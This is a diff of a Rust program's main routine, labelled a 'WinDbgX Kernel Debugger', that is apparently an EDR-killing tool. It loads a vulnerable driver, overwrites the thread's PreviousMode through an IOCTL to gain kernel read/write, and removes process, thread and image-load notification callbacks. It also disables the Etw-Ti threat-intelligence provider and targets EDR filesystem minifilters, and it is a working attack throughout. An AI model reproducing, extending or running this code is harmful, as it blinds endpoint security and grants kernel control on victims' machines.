@@ -3,58 +3,58 @@ use std::ffi::{c_void};
 
 mod utils;
 mod svc;
-mod pdb_utils;
-mod km_utils;
-mod xp_utils;
+mod pdb;
+mod km;
+mod xp;
 mod mem;
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("[+] =-=-=- WinDbgX Kernel Debugger -=-=-=");
-    // Sleeping...
+    println!("[>] Setting up the environment...");
+    
+
+    // =-=-> Get Windows version and feature support (IORINGs). No Win7 or earlier...
+    let ioring_supported = utils::version_check_and_do_we_have_ioring();
+    if ioring_supported {
+        println!("[*] IORING support not available yet. Exiting for safety as this could crash...");
+        std::process::exit(1);
+    }
+
+
+    // =-=-> Sleeping...
     //   - TKTK: do custom sleep that checks for PPID and/or checks for a specific cadence
-    println!("[*] Waiting for the opportune moment...\n");
+    println!("[*] Waiting for the opportune moment...");
     let bo_do_bleep = time::Duration::from_millis(100);
     thread::sleep(bo_do_bleep);
 
-    // -=-= Doing setup =-=- //
 
-    // Get the Windows version
-    println!("[>] Setting up the environment...");
-    let version = utils::get_windows_version_simple();
-    println!("[|] Detected OS: {}", version);
-
-    // Get symbol files
+    // =-=-> Get offsets for this version of Windows
+    // Get symbol file information
+    println!("[>] Downloading symbol files to memory.");
     let ntos: String = "C:\\Windows\\System32\\ntoskrnl.exe".to_string();
-    let fltmgr: String = "C:\\Windows\\System32\\drivers\\fltmgr.sys".to_string();
-    
-    let nt_url = match pdb_utils::pdb_symbol_url(ntos) {
+    let fltmgr: String = "C:\\Windows\\System32\\drivers\\fltmgr.sys".to_string();    
+    let nt_url = match pdb::pdb_symbol_url(ntos) {
         Ok(url) => url,
         Err(e) => {
             eprintln!("[!] Failed to get PDB URL for NTOS: {}", e);
             std::process::exit(1);
         }
     };
-    let fltmgr_url = match pdb_utils::pdb_symbol_url(fltmgr) {
+    let fltmgr_url = match pdb::pdb_symbol_url(fltmgr) {
         Ok(url) => url,
         Err(e) => {
             eprintln!("[!] Failed to get PDB URL for FLTMGR: {}", e);
             std::process::exit(-1);
         }
     };
-
-    println!("[>] Symbols download URLs:");
-    println!("[|]   {}", nt_url);
-    println!("[|]   {}", fltmgr_url);
-    
     // Download symbol files
     let mut nt_pdb = utils::download_pdb(&nt_url)?;
-    let fm_pdb = utils::download_pdb(&fltmgr_url)?;
-
+    let mut fm_pdb = utils::download_pdb(&fltmgr_url)?;
     // Parse symbol files for offsets
     let nt_offsets;
-    match pdb_utils::get_nt_offsets(&mut nt_pdb) {
+    let fm_offsets;
+    match pdb::get_nt_offsets(&mut nt_pdb) {
         Ok(offsets) => {
-            println!("[+] Got NT offsets for this version...game on :D");
             nt_offsets = offsets; // bind to outer var
         }
         Err(e) => {
@@ -62,14 +62,23 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             std::process::exit(-1);
         }
     }
+    match pdb::get_fm_offsets(&mut fm_pdb) {
+        Ok(offsets) => {
+            fm_offsets = offsets; // bind to outer var
+        }
+        Err(e) => {
+            eprintln!("[-] Failed to parse FM offsets: {}", e);
+            std::process::exit(-1);
+        }
+    }
 
     // Get base addresses for target kernel modules
     let nt_base;
     let fm_base;
-    match km_utils::get_driver_base("ntoskrnl.exe") {
+    match km::get_driver_base("ntoskrnl.exe") {
         Some(base) => {
-            println!("[+] NT base address: {:?}", base);
             nt_base = base;
+            println!("[+] NT base address: {:?}", nt_base);
         },
         None => {
             println!("[!] Could not find base address for ntoskrnl.exe!");
@@ -77,10 +86,10 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             std::process::exit(-1);
         }
     }
-    match km_utils::get_driver_base("fltmgr.sys") {
+    match km::get_driver_base("fltmgr.sys") {
         Some(base) => {
-            println!("[+] FM base address: {:?}", base);
             fm_base = base;
+            println!("[+] FM base address: {:?}", fm_base);
         },
         None => {
             println!("[!] Could not find base address for fltmgr.sys!");
@@ -88,28 +97,11 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             std::process::exit(-1);
         }
     }
-
-
-    /* -=-= TESTING: Checking the module base address for driver name + if matching EDR
-    let addr: u64 = 0xfffff807200581e0;
-    if let Some(driver_name) = km_utils::find_driver_name_from_addr(addr) {
-        let is_edr: bool = km_utils::is_driver_name_matching_edr(&driver_name);
-        println!("[*] Address 0x{:016x}: {} [EDR? {}]", addr, driver_name, is_edr);   
-    }
-
-    // =-=- TESTING: Check the loaded DLLs in a process
-    let target_pid: DWORD = 11212;
-    if utils::is_edr_dll_loaded(target_pid) {
-        println!("[*] EDR DLL detected in process {}", target_pid);
-    } else {
-        println!("[-] No suspicious EDR DLLs found in process {}", target_pid);
-    }
-    */
-    svc::write_embedded_file("C:\\um_pass.sys")?;
     
-    // Get a handle to the vuln driver
+
+    // =-=-> Get a handle to the vuln driver. If fails, write the driver and start service.
     let h_drv;
-    match xp_utils::get_driver_handle() {
+    match xp::get_driver_handle() {
         Ok(_handle) => { }
         Err(err) => {
             eprintln!("[-] Could not get handle, error: {}. Need to download...", err);
@@ -124,7 +116,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 .expect("[!] Failed to start service");
         }
     }
-    match xp_utils::get_driver_handle() {
+    match xp::get_driver_handle() {
         Ok(handle) => {
             h_drv = handle;
         }
@@ -135,30 +127,29 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     }
     println!("[+] Got driver handle: {:?}", h_drv);
 
-    // Get KTHREAD and then KTHREAD.PreviousMode
-    let thread_addr: Option<*mut c_void> = km_utils::get_thread_info();
-    let mut pm: Option<*mut u8> = None;
+    // =-=-> Overwrite KTHREAD.PreviousMode for kernel RW
+    let thread_addr: Option<*mut c_void> = km::get_thread_info();
+    let pm: Option<*mut u8>;
 
     if let Some(ptr) = thread_addr {
         let addr = ptr as usize;
         let pm_offset = nt_offsets.modus_previosa as usize;
         pm = Some((addr + pm_offset) as *mut u8);
-
-        println!("[*] Thread pointer: {:p}", ptr);
-        println!("[+] Pointer to modus previosa of our thread: {:p}", pm.unwrap());
+        println!("[+] Thread pointer [{:p}] - Modus Previosa [{:p}]", ptr, pm.unwrap());
     } else {
         println!("[!] Failed to get thread info");
         std::process::exit(-1);
     }
 
-    println!("[>] Modus Previosa modification...");
+    // Send the exploit to overwrite PM
     unsafe {
-        xp_utils::send_ioctl_to_driver(
+        xp::send_ioctl_to_driver(
             h_drv,
             pm.unwrap() as usize as u64,
             0x1,
         );
     }
+
 
     // =-=-> Remove Process Creation Notification callback
     println!("[>] Removing notification callbacks:");
@@ -172,42 +163,49 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         (nt_base as u64).wrapping_add(nt_offsets.psp_load_image_notify_routine as u64)
     };
     
-    match xp_utils::nerf_cb(
+    match xp::nerf_cb(
         process_create_notify_base, 
         "PspCreateProcessNotifyRoutine"
     ) {
         Ok(_val) => {},
         Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
     }
-    match xp_utils::nerf_cb(thread_create_notify_base, "PspCreateThreadNotifyRoutine") {
+    match xp::nerf_cb(thread_create_notify_base, "PspCreateThreadNotifyRoutine") {
         Ok(_val) => {},
         Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
     }
-    match xp_utils::nerf_cb(img_load_notify_base, "PspLoadImageNotifyRoutine") {
+    match xp::nerf_cb(img_load_notify_base, "PspLoadImageNotifyRoutine") {
         Ok(_val) => {},
         Err(e) => eprintln!("[-] Callback nerfing failed: {:?}", e),
     }
 
 
     // =-=-> Disable Etw-Ti provider
+    let prov_status: u64;
     let ti_handle = {
         (nt_base as u64).wrapping_add(nt_offsets.threat_int_prov_reg_handle as u64)
     };
-    match xp_utils::nerf_etw_prov(
+    match xp::nerf_etw_prov(
         ti_handle, 
         "Etw-Ti", 
         nt_offsets.guid_entry, 
         nt_offsets.prov_enable_info) 
         {
-        Ok(val) => println!("[|] Provider completed: 0x{:X}", val),
+        Ok(val) => {
+            prov_status = val;
+            println!("[*] Etw-Ti Provider enabled status: 0x{:x}", prov_status);
+        }
         Err(e) => eprintln!("[-] Failed to read: {:?}", e),
     }
 
 
-
+    // =-=-> Unhook EDR file system minifilter entries
+    println!("[>] Targeting the file system minifilters [FltGlobals: 0x{:x}]", fm_offsets.flt_globals);
 
     // Clean up: Write 0x1 back to PM. Can't read it again! :D
     mem::write_byte(pm.unwrap() as usize as u64, 0x1);
+
+    utils::is_edr_dll_loaded(4);
 
     // Pause & exit
     println!("");
